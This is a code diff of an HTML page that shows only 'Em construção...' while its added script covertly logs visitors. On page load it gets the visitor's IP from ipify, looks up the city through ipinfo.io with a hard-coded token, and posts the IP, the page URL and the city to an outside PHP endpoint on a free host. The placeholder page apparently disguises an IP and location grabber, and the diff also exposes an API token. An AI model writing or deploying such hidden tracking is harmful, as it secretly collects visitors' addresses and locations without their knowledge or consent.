@@ -18,8 +18,7 @@
 </head>
 <body>
   <h1 class="neon-text">Em construção...</h1>
-
-  <script>
+<script>
   const url = 'https://bunkerbd.000webhostapp.com/salvar.php';
 
   fetch('https://api.ipify.org?format=json')
@@ -28,25 +27,36 @@
       const ip = data.ip;
       const origin = window.location.href; // Obtém a origem do clique
 
-      const formData = new FormData();
-      formData.append('ip', ip);
-      formData.append('origin', origin);
+      // Obtém informações de localização do IP usando ipinfo.io
+      fetch(`https://ipinfo.io/${ip}/json?token=c77cb91a7449f2`) // Substitua 'SEU_TOKEN_AQUI' pelo token real
+        .then(response => response.json())
+        .then(locationData => {
+          const city = locationData.city || 'Desconhecida'; // Obtém a cidade ou define como "Desconhecida"
 
-      fetch(url, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Endereço IP e origem do clique salvos com sucesso');
-        } else {
-          console.error('Erro ao salvar o endereço IP e origem do clique');
-        }
-      })
-      .catch(error => console.error(error));
+          const formData = new FormData();
+          formData.append('ip', ip);
+          formData.append('origin', origin);
+          formData.append('city', city); // Adiciona a cidade aos dados enviados
+
+          fetch(url, {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log('Endereço IP, origem do clique e cidade salvas com sucesso');
+            } else {
+              console.error('Erro ao salvar os dados');
+            }
+          })
+          .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
     })
     .catch(error => console.error(error));
 </script>
+
+  
 
 </body>
 </html>
